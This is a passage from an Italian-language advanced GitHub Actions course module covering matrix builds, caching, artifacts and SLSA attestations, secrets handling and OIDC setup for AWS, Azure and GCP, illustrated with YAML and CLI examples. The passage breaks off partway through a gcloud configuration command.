---
corso: "GitHub e Git Actions"
fase: "4 — GitHub Actions"
modulo: 18
titolo: "GitHub Actions Avanzate — Guida Approfondita"
versione: "GitHub Actions 2024"
livello: "Avanzato"
prerequisiti: ["GitHub Actions Workflow Sintassi (modulo 17)", "YAML avanzato", "Docker base"]
obiettivi:
  - "Progettare matrix strategy dinamiche per CI multi-piattaforma e multi-versione"
  - "Implementare caching e artifacts per ottimizzare tempi di build e condividere dati tra job"
  - "Creare custom actions (composite, JavaScript, Docker) riutilizzabili nell'organizzazione"
  - "Configurare environments con protection rules e approvazione manuale per deploy sicuri"
  - "Costruire reusable workflows e gestire il nesting con limiti e best practice"
tag: [github-actions, matrix, cache, artifacts, environments, composite-actions, reusable-workflows, self-hosted-runners, oidc, secrets]
---

# GitHub Actions Avanzate — Guida Approfondita

> **Modulo 18** · **Aggiornamento:** 2026-05-24

> **Obiettivi di apprendimento**
>
> Al termine di questo modulo sarai in grado di:
>
> 1. Progettare matrix strategy dinamiche per CI multi-piattaforma e multi-versione
> 2. Implementare caching e artifacts per ottimizzare tempi di build e condividere dati tra job
> 3. Creare custom actions (composite, JavaScript, Docker) riutilizzabili nell'organizzazione
> 4. Configurare environments con protection rules e approvazione manuale per deploy sicuri
> 5. Costruire reusable workflows e gestire il nesting con limiti e best practice

## Idee guida
1. **Custom Actions: composite, JS, Docker.**
2. **Cache (`actions/cache@v4`) per dep speed-up.**
3. **Artifacts upload/download tra job.**
4. **Environments + protection rules (manual approval).**


## Indice
- [Panoramica](#panoramica)
- [Architettura di un Pipeline Avanzato](#architettura-di-un-pipeline-avanzato)
- [Matrix Strategy](#matrix-strategy)
- [Caching](#caching)
- [Artifacts](#artifacts)
- [Secrets Management](#secrets-management)
- [Concurrency Control](#concurrency-control)
- [Environments e Protection Rules](#environments-e-protection-rules)
- [Reusable Workflows](#reusable-workflows)
- [Composite Actions](#composite-actions)
- [Custom Actions JavaScript](#custom-actions-javascript)
- [Custom Actions Docker](#custom-actions-docker)
- [Self-Hosted Runners](#self-hosted-runners)
- [Larger Runners e Runner GPU/ARM64](#larger-runners-e-runner-gpuarm64)
- [Workflow Dispatch e Input Personalizzati](#workflow-dispatch-e-input-personalizzati)
- [Concatenamento di Workflow (Event Chaining)](#concatenamento-di-workflow-event-chaining)
- [Espressioni Avanzate e Funzioni](#espressioni-avanzate-e-funzioni)
- [Monorepo e Path Filtering](#monorepo-e-path-filtering)
- [Security Hardening e Supply Chain](#security-hardening-e-supply-chain)
- [Best Practices](#best-practices)
- [Troubleshooting](#troubleshooting)
- [Riferimenti](#riferimenti)

---

## Panoramica

Le funzionalità avanzate di GitHub Actions trasformano la piattaforma da semplice sistema CI/CD a infrastruttura di automazione enterprise. Questa guida esplora in profondità le matrix strategy per test multi-dimensionali, il caching per ottimizzare i tempi di build, gli artifacts per la condivisione di dati tra job, la gestione dei segreti con OIDC, gli environments con protection rules per deploy sicuri, i reusable workflows per la standardizzazione cross-repository, le composite actions per la modularizzazione e i self-hosted runners per requisiti infrastrutturali specifici.

Padroneggiare queste funzionalità è essenziale per costruire pipeline CI/CD scalabili, sicure e mantenibili in contesti enterprise dove affidabilità e velocità sono requisiti critici.

### Quando usare quale funzionalità

La scelta tra le diverse funzionalità avanzate dipende dal contesto e dai requisiti specifici. Di seguito una guida rapida per orientarsi:

| Esigenza | Funzionalità consigliata |
|----------|--------------------------|
| Testare su più OS/versioni in parallelo | Matrix Strategy |
| Ridurre i tempi di installazione dipendenze | Caching con `actions/cache@v4` |
| Passare build output tra job | Artifacts upload/download |
| Standardizzare pipeline nell'organizzazione | Reusable Workflows |
| Raggruppare step ripetuti in un blocco riutilizzabile | Composite Actions |
| Creare logica personalizzata complessa | Custom Actions JavaScript/Docker |
| Controllare l'accesso ai deploy | Environments + Protection Rules |
| Evitare esecuzioni duplicate | Concurrency Control |
| Eliminare credenziali statiche | OIDC + Workload Identity Federation |
| Requisiti hardware specifici (GPU, ARM) | Self-Hosted o Larger Runners |
| Pipeline selettive in monorepo | Path Filtering + Matrix Dinamica |

### Il modello di esecuzione

GitHub Actions opera su un modello event-driven: un evento (push, pull request, schedule, dispatch manuale) attiva un workflow, che contiene uno o più job. Ogni job viene eseguito su un runner (macchina virtuale o container) e contiene una sequenza ordinata di step. I job di default sono indipendenti e paralleli; le dipendenze tra job si dichiarano con `needs`.

Questo modello ha implicazioni importanti per la progettazione avanzata:

- **Isolamento dei job**: ogni job ha il suo filesystem, le sue variabili d'ambiente e il suo runner. I dati devono essere passati esplicitamente tramite artifacts o outputs.
- **Parallelismo nativo**: senza `needs`, i job partono contemporaneamente. La matrix strategy moltiplica questo parallelismo creando un job per ogni combinazione di parametri.
- **Idempotenza**: un workflow ben progettato deve poter essere rieseguito senza effetti collaterali indesiderati. Il concurrency control aiuta a gestire esecuzioni sovrapposte.
- **Composabilità**: reusable workflows e composite actions permettono di costruire pipeline complesse componendo blocchi più piccoli e testati indipendentemente.

---

## Architettura di un Pipeline Avanzato

Prima di immergersi nelle singole funzionalità, è utile comprendere come si combinano in un pipeline enterprise tipico. Un'architettura avanzata segue il principio della separazione delle responsabilità: ogni workflow ha un compito specifico, e i workflow si coordinano tramite eventi e dipendenze.

### Diagramma di flusso di un pipeline completo

```
┌──────────────────────────────────────────────────────────────────┐
│                         EVENTO TRIGGER                           │
│            (push, pull_request, workflow_dispatch, schedule)      │
└──────────────┬───────────────────────────────────────────────────┘
               │
               ▼
┌──────────────────────────────────────────────────────────────────┐
│                    WORKFLOW: CI Pipeline                          │
│  ┌─────────────┐  ┌──────────────┐  ┌──────────────────────┐    │
│  │  Detect      │  │  Lint &      │  │  Matrix Test          │    │
│  │  Changes     │──│  Format      │──│  (OS x Version x DB)  │    │
│  │  (paths)     │  │  (parallel)  │  │  (parallel, cached)   │    │
│  └─────────────┘  └──────────────┘  └──────────────────────┘    │
│                                              │                    │
│                                              ▼                    │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────┐    │
│  │  Build       │  │  Upload      │  │  Security Scan        │    │
│  │  (cached)    │──│  Artifacts   │──│  (SAST, deps audit)   │    │
│  └──────────────┘  └──────────────┘  └──────────────────────┘    │
└──────────────┬───────────────────────────────────────────────────┘
               │ workflow_run / needs
               ▼
┌──────────────────────────────────────────────────────────────────┐
│                  WORKFLOW: CD Pipeline                            │
│  ┌─────────────┐  ┌──────────────┐  ┌──────────────────────┐    │
│  │  Deploy      │  │  Deploy      │  │  Deploy               │    │
│  │  Dev         │──│  Staging     │──│  Production           │    │
│  │  (auto)      │  │  (auto+gate) │  │  (manual approval)    │    │
│  └─────────────┘  └──────────────┘  └──────────────────────┘    │
└──────────────────────────────────────────────────────────────────┘
```

### Principi architetturali per pipeline enterprise

1. **Single Responsibility**: ogni workflow ha un solo scopo (CI, CD, release, security scan). Evitare workflow monolitici che fanno tutto.

2. **Fail Fast, Report All**: usare `fail-fast: false` nella matrix per raccogliere tutti i fallimenti, ma strutturare il pipeline per bloccarsi al primo gate critico.

3. **Cache Everything**: cachare dipendenze, build intermedie, Docker layers. Il caching è il singolo fattore con maggior impatto sui tempi di esecuzione.

4. **Least Privilege**: ogni job dichiara solo i permessi necessari. Il `GITHUB_TOKEN` ha scope limitato per default; non ampliare senza motivo.

5. **Immutable Artifacts**: gli artifacts di build sono immutabili. Lo stesso artifact viene promosso tra environment (dev → staging → production), non ricompilato.

6. **Observability**: ogni step critico produce output strutturato. Usare annotations, job summaries e artifact attestations per la tracciabilità.

### Anti-pattern da evitare

**Workflow monolitico**: un singolo workflow che esegue lint, test, build, deploy e notifiche in una catena sequenziale. Se il lint fallisce, non serve attendere che il job di deploy venga valutato e skippato — meglio separare CI e CD in workflow distinti.

**Over-engineering della matrix**: matrici troppo ampie (es. 5 OS x 5 versioni x 3 database = 75 job) consumano minuti runner rapidamente. Selezionare le combinazioni realisticamente necessarie e usare `include` per le combinazioni di edge case.

**Secrets condivisi ovunque**: passare `secrets: inherit` a tutti i reusable workflows senza discriminazione espone i segreti a contesti che non ne hanno bisogno. Preferire il passaggio esplicito dei soli segreti necessari.

**Cache keys troppo generiche**: una key come `${{ runner.os }}-deps` verrà sovrascritta ad ogni build, rendendo la cache inutile. Le key devono essere specifiche (includere l'hash del lockfile) con restore-keys per il fallback graduale.

---

## Matrix Strategy

### Configurazione Base

La matrix strategy permette di eseguire lo stesso job con combinazioni diverse di parametri, creando automaticamente un job per ogni combinazione. Ogni combinazione produce un job indipendente con le proprie risorse, il proprio runner e il proprio spazio di lavoro.

La potenza della matrix strategy risiede nella sua capacità di generare automaticamente il prodotto cartesiano di tutti i parametri specificati: se si definiscono 3 valori per il parametro OS e 3 valori per il parametro node-version, GitHub Actions genera automaticamente 9 job (3 x 3), ciascuno con una combinazione unica di valori.

```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
        node-version: [18, 20, 22]
        # Genera 9 job (3 OS x 3 Node versions)
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
      - run: npm ci
      - run: npm test
```

### Include e Exclude

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, macos-latest, windows-latest]
    node-version: [18, 20, 22]

    # Aggiungere combinazioni specifiche con proprietà extra
    include:
      - os: ubuntu-latest
        node-version: 22
        coverage: true                # Proprietà extra solo per questa combinazione
      - os: ubuntu-latest
        node-version: 18
        experimental: true

    # Rimuovere combinazioni specifiche
    exclude:
      - os: windows-latest
        node-version: 18             # Windows + Node 18 non testato
      - os: macos-latest
        node-version: 18             # macOS + Node 18 non testato
```

### Fail-Fast e Max-Parallel

```yaml
strategy:
  fail-fast: false          # Non cancellare gli altri job se uno fallisce
  max-parallel: 3           # Massimo 3 job in parallelo
  matrix:
    os: [ubuntu-latest, macos-latest, windows-latest]
    node-version: [18, 20, 22]
```

### Matrix Dinamica

```yaml
jobs:
  prepare:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.set-matrix.outputs.matrix }}
    steps:
      - id: set-matrix
        run: |
          # Generare la matrice dinamicamente
          MATRIX=$(cat << 'EOF'
          {
            "include": [
              {"project": "frontend", "path": "apps/frontend", "node": "20"},
              {"project": "api", "path": "apps/api", "node": "20"},
              {"project": "worker", "path": "apps/worker", "node": "18"}
            ]
          }
          EOF
          )
          echo "matrix=$MATRIX" >> "$GITHUB_OUTPUT"

  test:
    needs: prepare
    runs-on: ubuntu-latest
    strategy:
      matrix: ${{ fromJSON(needs.prepare.outputs.matrix) }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}
      - run: cd ${{ matrix.path }} && npm ci && npm test
```

### Matrix Dinamica basata su File Modificati

Uno dei pattern più potenti per monorepo: generare la matrice solo per i componenti che sono cambiati. Questo riduce drasticamente i tempi di CI per repository con decine di pacchetti.

```yaml
jobs:
  detect-changes:
    runs-on: ubuntu-latest
    outputs:
      matrix: ${{ steps.generate.outputs.matrix }}
      has_changes: ${{ steps.generate.outputs.has_changes }}
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # Necessario per git diff

      - name: Detect changed packages
        id: generate
        run: |
          # Confrontare con il branch base
          CHANGED_FILES=$(git diff --name-only origin/main...HEAD)

          MATRIX='{"include":['
          FIRST=true

          for dir in packages/*/; do
            PKG_NAME=$(basename "$dir")
            # Verificare se ci sono file modificati in questo pacchetto
            if echo "$CHANGED_FILES" | grep -q "^packages/$PKG_NAME/"; then
              if [ "$FIRST" = false ]; then
                MATRIX+=','
              fi
              MATRIX+="{\"package\":\"$PKG_NAME\",\"path\":\"$dir\"}"
              FIRST=false
            fi
          done

          MATRIX+=']}'

          if [ "$FIRST" = true ]; then
            echo "has_changes=false" >> "$GITHUB_OUTPUT"
            echo "matrix={\"include\":[]}" >> "$GITHUB_OUTPUT"
          else
            echo "has_changes=true" >> "$GITHUB_OUTPUT"
            echo "matrix=$MATRIX" >> "$GITHUB_OUTPUT"
          fi

  test:
    needs: detect-changes
    if: needs.detect-changes.outputs.has_changes == 'true'
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix: ${{ fromJSON(needs.detect-changes.outputs.matrix) }}
    steps:
      - uses: actions/checkout@v4
      - name: Test ${{ matrix.package }}
        run: |
          cd ${{ matrix.path }}
          npm ci
          npm test
```

### Matrix con Servizi (Service Containers)

Per testare con diversi database o servizi esterni, la matrix può includere configurazioni di servizi:

```yaml
jobs:
  integration-test:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        database: [postgres, mysql]
        include:
          - database: postgres
            db_image: postgres:16
            db_port: 5432
            db_user: postgres
            db_password: postgres
            db_name: testdb
            connection_string: "postgresql://postgres:postgres@localhost:5432/testdb"
          - database: mysql
            db_image: mysql:8.0
            db_port: 3306
            db_user: root
            db_password: mysql
            db_name: testdb
            connection_string: "mysql://root:mysql@localhost:3306/testdb"

    services:
      database:
        image: ${{ matrix.db_image }}
        env:
          POSTGRES_PASSWORD: ${{ matrix.db_password }}
          POSTGRES_DB: ${{ matrix.db_name }}
          MYSQL_ROOT_PASSWORD: ${{ matrix.db_password }}
          MYSQL_DATABASE: ${{ matrix.db_name }}
        ports:
          - ${{ matrix.db_port }}:${{ matrix.db_port }}
        options: >-
          --health-cmd "${{ matrix.database == 'postgres' && 'pg_isready' || 'mysqladmin ping -h localhost' }}"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

    steps:
      - uses: actions/checkout@v4
      - name: Run integration tests
        env:
          DATABASE_URL: ${{ matrix.connection_string }}
        run: npm run test:integration
```

### Matrix Multi-Dimensionale Complessa

Per progetti che necessitano di testare combinazioni di linguaggio, framework e architettura:

```yaml
strategy:
  fail-fast: false
  max-parallel: 6
  matrix:
    python-version: ['3.10', '3.11', '3.12']
    django-version: ['4.2', '5.0', '5.1']
    database: ['sqlite', 'postgres']
    exclude:
      # Django 5.1 non supporta Python 3.10
      - python-version: '3.10'
        django-version: '5.1'
    include:
      # Aggiungere test di copertura solo per la combinazione principale
      - python-version: '3.12'
        django-version: '5.1'
        database: 'postgres'
        coverage: true
        upload_coverage: true
```

---

## Caching

### actions/cache

```yaml
steps:
  - uses: actions/checkout@v4

  # Cache generica
  - name: Cache node_modules
    uses: actions/cache@v4
    id: npm-cache
    with:
      path: node_modules
      key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
      restore-keys: |
        ${{ runner.os }}-node-

  - name: Install dependencies
    if: steps.npm-cache.outputs.cache-hit != 'true'
    run: npm ci
```

### Caching Integrato nelle Setup Actions

```yaml
# Node.js — caching automatico
- uses: actions/setup-node@v4
  with:
    node-version: 20
    cache: 'npm'            # Supporta: npm, yarn, pnpm

# Python — caching automatico
- uses: actions/setup-python@v5
  with:
    python-version: '3.12'
    cache: 'pip'            # Supporta: pip, pipenv, poetry

# Go — caching automatico
- uses: actions/setup-go@v5
  with:
    go-version: '1.22'
    cache: true

# Java — caching automatico
- uses: actions/setup-java@v4
  with:
    distribution: 'temurin'
    java-version: '21'
    cache: 'maven'          # Supporta: maven, gradle, sbt
```

### Cache Multi-Directory

```yaml
- name: Cache multiple paths
  uses: actions/cache@v4
  with:
    path: |
      ~/.npm
      ~/.cache/Cypress
      node_modules
    key: ${{ runner.os }}-deps-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      ${{ runner.os }}-deps-
```

### Cache per Docker Layers

```yaml
- name: Build Docker image with cache
  uses: docker/build-push-action@v5
  with:
    context: .
    push: true
    tags: ghcr.io/org/app:latest
    cache-from: type=gha
    cache-to: type=gha,mode=max

# Alternativa: cache registry
    cache-from: type=registry,ref=ghcr.io/org/app:cache
    cache-to: type=registry,ref=ghcr.io/org/app:cache,mode=max
```

### Limiti e Strategia

```
# Limiti del caching:
# - Dimensione massima per cache: 10 GB
# - Totale cache per repository: 10 GB (con eviction LRU)
# - Cache non usate da 7 giorni vengono eliminate
# - Cache sono isolate per branch (con fallback al branch predefinito)

# Strategia di cache keys:
# 1. Key esatto: match perfetto → usa la cache
# 2. restore-keys: match parziale → usa la migliore corrispondenza
# 3. Nessun match → build da zero

# Pattern consigliato per le key:
# ${{ runner.os }}-<tool>-${{ hashFiles('**/lockfile') }}
```

### Cache Scoping e Isolamento per Branch

Il sistema di caching di GitHub Actions implementa un modello di isolamento per branch che è fondamentale comprendere per evitare cache miss inaspettati:

```
# Regole di scoping della cache:
#
# 1. Un workflow su un feature branch può LEGGERE cache da:
#    - Il proprio branch
#    - Il branch predefinito (main/master)
#
# 2. Un workflow su un feature branch NON può leggere cache da:
#    - Branch fratelli (altri feature branch)
#    - Branch figli
#
# 3. La cache è immutabile: se una entry con la stessa key esiste già,
#    il salvataggio viene saltato silenziosamente.
#
# Conseguenza pratica:
# - Mantenere un workflow schedulato su main che riscalda le cache
# - I feature branch beneficiano automaticamente delle cache di main
```

Esempio di workflow di riscaldamento cache su `main`:

```yaml
name: Cache Warmup
on:
  schedule:
    - cron: '0 6 * * 1-5'  # Ogni giorno lavorativo alle 6:00 UTC
  push:
    branches: [main]
    paths:
      - '**/package-lock.json'
      - '**/yarn.lock'
      - '**/pnpm-lock.yaml'

jobs:
  warmup:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Cache node_modules
        uses: actions/cache@v4
        with:
          path: |
            node_modules
            ~/.npm
          key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}

      - run: npm ci

      - name: Cache build output
        uses: actions/cache@v4
        with:
          path: .next/cache
          key: ${{ runner.os }}-nextjs-${{ hashFiles('**/package-lock.json') }}-${{ hashFiles('**/*.ts', '**/*.tsx') }}
          restore-keys: |
            ${{ runner.os }}-nextjs-${{ hashFiles('**/package-lock.json') }}-
            ${{ runner.os }}-nextjs-

      - run: npm run build
```

### Strategia di Cache Key Avanzata

La progettazione delle cache key è cruciale. Una key troppo specifica causa cache miss frequenti; una key troppo generica causa l'uso di cache obsolete:

```yaml
# Pattern a cascata per massimizzare i cache hit
- name: Cache with cascading keys
  uses: actions/cache@v4
  with:
    path: node_modules
    key: ${{ runner.os }}-node-${{ matrix.node-version }}-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      ${{ runner.os }}-node-${{ matrix.node-version }}-
      ${{ runner.os }}-node-
      ${{ runner.os }}-

# Per Go: cache del modulo e della build separati
- name: Cache Go modules
  uses: actions/cache@v4
  with:
    path: |
      ~/go/pkg/mod
      ~/.cache/go-build
    key: ${{ runner.os }}-go-${{ hashFiles('**/go.sum') }}
    restore-keys: |
      ${{ runner.os }}-go-

# Per Rust: cache della directory target e del registry
- name: Cache Rust
  uses: actions/cache@v4
  with:
    path: |
      ~/.cargo/bin/
      ~/.cargo/registry/index/
      ~/.cargo/registry/cache/
      ~/.cargo/git/db/
      target/
    key: ${{ runner.os }}-cargo-${{ hashFiles('**/Cargo.lock') }}
    restore-keys: |
      ${{ runner.os }}-cargo-
```

### Cache Save e Restore Separati

Per scenari in cui si vuole salvare la cache solo in determinate condizioni (ad esempio, solo su `main`):

```yaml
steps:
  # Sempre tentare il restore
  - name: Restore cache
    id: cache-restore
    uses: actions/cache/restore@v4
    with:
      path: node_modules
      key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
      restore-keys: |
        ${{ runner.os }}-node-

  - run: npm ci

  # Salvare solo su main per evitare cache bloat
  - name: Save cache
    if: github.ref == 'refs/heads/main' && steps.cache-restore.outputs.cache-hit != 'true'
    uses: actions/cache/save@v4
    with:
      path: node_modules
      key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
```

### Monitorare e Diagnosticare la Cache

```bash
# Elencare le cache del repository via CLI
gh cache list --repo owner/repo --sort size --order desc

# Vedere la dimensione totale
gh cache list --repo owner/repo --json key,sizeInBytes \
  --jq '[.[].sizeInBytes] | add / 1048576 | round | tostring + " MB"'

# Eliminare cache specifiche (utile quando una cache è corrotta)
gh cache delete "Linux-node-abc123" --repo owner/repo

# Eliminare tutte le cache di un branch
gh cache list --repo owner/repo --ref refs/heads/feature-x \
  --json id --jq '.[].id' | xargs -I{} gh cache delete {} --repo owner/repo
```

---

## Artifacts

### Upload e Download

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build

      - name: Upload build artifacts
        uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: |
            dist/
            !dist/**/*.map       # Escludere source maps
          retention-days: 7
          compression-level: 6   # 0-9, default 6
          if-no-files-found: error  # error, warn, ignore

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - name: Download build artifacts
        uses: actions/download-artifact@v4
        with:
          name: build-output
          path: dist/

      - run: ls -la dist/
      - run: ./deploy.sh dist/
```

### Artifacts Multi-Job

```yaml
jobs:
  build-frontend:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cd frontend && npm ci && npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: frontend-build
          path: frontend/dist/

  build-backend:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: cd backend && npm ci && npm run build
      - uses: actions/upload-artifact@v4
        with:
          name: backend-build
          path: backend/dist/

  deploy:
    needs: [build-frontend, build-backend]
    runs-on: ubuntu-latest
    steps:
      # Scaricare tutti gli artifacts
      - uses: actions/download-artifact@v4
        # Senza 'name', scarica TUTTI gli artifacts

      - run: |
          ls -R frontend-build/
          ls -R backend-build/
```

### Artifact Attestations

```yaml
  - name: Attest build provenance
    uses: actions/attest-build-provenance@v1
    with:
      subject-path: dist/app.tar.gz
```

### Artifact Attestations e SLSA Build Level 3

Le artifact attestations sono un meccanismo crittografico che lega un artifact al repository sorgente e al workflow di build che lo ha prodotto. Questo è fondamentale per la supply chain security e per raggiungere la conformità SLSA (Supply-chain Levels for Software Artifacts).

#### Come funzionano le attestazioni

Ogni attestazione è un documento firmato nel formato in-toto che contiene:
- **Subject**: l'artifact (nome + digest SHA-256)
- **Predicate**: informazioni sulla provenienza (SLSA build provenance)
- **Firma**: generata con un certificato Sigstore a vita breve

```yaml
name: Build and Attest
on:
  push:
    tags: ['v*']

permissions:
  id-token: write        # Per la firma Sigstore
  contents: read
  attestations: write     # Per creare attestazioni

jobs:
  build-and-attest:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build application
        run: |
          npm ci
          npm run build
          tar czf app-${{ github.ref_name }}.tar.gz dist/

      - name: Attest build provenance
        uses: actions/attest-build-provenance@v2
        with:
          subject-path: app-${{ github.ref_name }}.tar.gz

      - name: Upload release artifact
        uses: actions/upload-artifact@v4
        with:
          name: release-${{ github.ref_name }}
          path: app-${{ github.ref_name }}.tar.gz
```

#### SLSA Build Level 3 con Reusable Workflows

Per raggiungere il livello SLSA Build Level 3, il workflow di build deve essere eseguito in un contesto isolato. Questo si ottiene combinando artifact attestations con reusable workflows:

```yaml
# .github/workflows/slsa-build.yml (reusable workflow isolato)
name: SLSA Build
on:
  workflow_call:
    inputs:
      version:
        required: true
        type: string
    outputs:
      artifact_digest:
        value: ${{ jobs.build.outputs.digest }}

permissions:
  id-token: write
  contents: read
  attestations: write

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      digest: ${{ steps.hash.outputs.digest }}
    steps:
      - uses: actions/checkout@v4

      - name: Build
        run: |
          npm ci --ignore-scripts  # No post-install scripts
          npm run build
          tar czf release.tar.gz dist/

      - name: Compute digest
        id: hash
        run: |
          DIGEST=$(sha256sum release.tar.gz | cut -d' ' -f1)
          echo "digest=$DIGEST" >> "$GITHUB_OUTPUT"

      - name: Attest provenance
        uses: actions/attest-build-provenance@v2
        with:
          subject-path: release.tar.gz

      - uses: actions/upload-artifact@v4
        with:
          name: slsa-release
          path: release.tar.gz
```

#### Verificare le attestazioni

```bash
# Verificare la provenienza di un artifact
gh attestation verify release.tar.gz --repo owner/repo

# Verificare con un artifact specifico e il suo digest
gh attestation verify release.tar.gz \
  --repo owner/repo \
  --signer-repo owner/repo \
  --format json

# Elencare tutte le attestazioni per un artifact
gh attestation list --repo owner/repo
```

#### SBOM Attestations

Oltre alla build provenance, è possibile attestare anche il Software Bill of Materials (SBOM):

```yaml
      - name: Generate SBOM
        uses: anchore/sbom-action@v0
        with:
          path: dist/
          output-file: sbom.spdx.json
          format: spdx-json

      - name: Attest SBOM
        uses: actions/attest-sbom@v1
        with:
          subject-path: release.tar.gz
          sbom-path: sbom.spdx.json
```

### Gestione dei Retention Days e Pulizia

```yaml
# Configurazione globale dei retention days a livello di repository
# Settings > Actions > General > Artifact and log retention

# Override per artifact specifico
- uses: actions/upload-artifact@v4
  with:
    name: test-results
    path: test-results/
    retention-days: 3        # Solo 3 giorni per risultati dei test

- uses: actions/upload-artifact@v4
  with:
    name: release-binary
    path: dist/app
    retention-days: 90       # 90 giorni per i binari di release
```

---

## Secrets Management

### Tipi di Segreti

```yaml
# Repository secrets
${{ secrets.DEPLOY_KEY }}

# Organization secrets
${{ secrets.ORG_DEPLOY_KEY }}

# Environment secrets (override dei repository secrets)
${{ secrets.PROD_DATABASE_URL }}

# GITHUB_TOKEN (automatico, limitato al repository)
${{ secrets.GITHUB_TOKEN }}
```

### OIDC (OpenID Connect)

OIDC elimina la necessità di memorizzare credenziali cloud come segreti. GitHub Actions ottiene un token JWT a vita breve che viene scambiato con il provider cloud per credenziali temporanee.

```yaml
# AWS con OIDC
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write     # Necessario per OIDC
      contents: read
    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
          aws-region: eu-west-1
          # Nessun access key o secret! Solo il ruolo IAM

      - run: aws s3 ls
```

```yaml
# Azure con OIDC
      - name: Azure Login
        uses: azure/login@v1
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
```

```yaml
# GCP con OIDC
      - name: Authenticate to Google Cloud
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: 'projects/123456/locations/global/workloadIdentityPools/gh-pool/providers/gh-provider'
          service_account: 'deploy@project.iam.gserviceaccount.com'
```

### Best Practices per i Segreti

```yaml
# MAI stampare segreti nei log
- run: echo "${{ secrets.API_KEY }}"  # GitHub li maschera ma è comunque rischioso

# Passare i segreti come variabili d'ambiente
- name: Deploy
  env:
    API_KEY: ${{ secrets.API_KEY }}
  run: ./deploy.sh  # Lo script usa $API_KEY

# Non usare segreti in if conditions (possibile leak tramite log)
# ERRATO:
if: secrets.DEPLOY_KEY != ''
# CORRETTO:
if: env.HAS_DEPLOY_KEY == 'true'
env:
  HAS_DEPLOY_KEY: ${{ secrets.DEPLOY_KEY != '' }}
```

### OIDC Deep Dive — Configurazione Completa per i Tre Cloud Provider

Il protocollo OIDC per GitHub Actions funziona in tre fasi:

1. **Token Request**: il runner richiede un JWT (JSON Web Token) al provider OIDC di GitHub (`https://token.actions.githubusercontent.com`)
2. **Token Exchange**: il JWT viene presentato al cloud provider, che lo valida e rilascia credenziali temporanee
3. **Accesso**: le credenziali temporanee vengono usate per operare sulle risorse cloud

#### AWS — Trust Policy IAM dettagliata

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:org/repo:ref:refs/heads/main"
        }
      }
    }
  ]
}
```

```yaml
# Workflow AWS OIDC completo con restrizione per branch
jobs:
  deploy-aws:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    environment: production
    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsDeployRole
          role-session-name: gha-deploy-${{ github.run_id }}
          aws-region: eu-west-1
          role-duration-seconds: 900  # 15 minuti, minimo possibile

      - name: Deploy to S3
        run: aws s3 sync dist/ s3://my-bucket/

      - name: Invalidate CloudFront
        run: |
          aws cloudfront create-invalidation \
            --distribution-id E1234567890 \
            --paths "/*"
```

#### GCP — Workload Identity Federation completa

```yaml
# Configurazione GCP con Workload Identity Federation
jobs:
  deploy-gcp:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4

      - name: Authenticate to Google Cloud
        id: auth
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: >-
            projects/123456789/locations/global/workloadIdentityPools/github-pool/providers/github-provider
          service_account: 'deploy-sa@my-project.iam.gserviceaccount.com'
          token_format: 'access_token'
          access_token_lifetime: '300s'  # 5 minuti

      - name: Deploy to Cloud Run
        uses: google-github-actions/deploy-cloudrun@v2
        with:
          service: my-service
          region: europe-west1
          image: gcr.io/my-project/my-app:${{ github.sha }}
```

```bash
# Setup GCP Workload Identity Federation via gcloud
gcloud iam workload-identity-pools create github-pool \
  --location="global" \
  --display-name="GitHub Actions Pool"

gcloud iam workload-identity-pools providers create-oidc github-provider \
  --location="global" \
  --workload-identity-pool="github-pool" \
  --display-name="GitHub Provider" \
  --attribute-mapping="google.subject=assertion.sub,attribute.repository=assertion.repository,attribute.ref=assertion.ref" \
  --attribute-condition="assertion.repository_owner=='my-org'" \
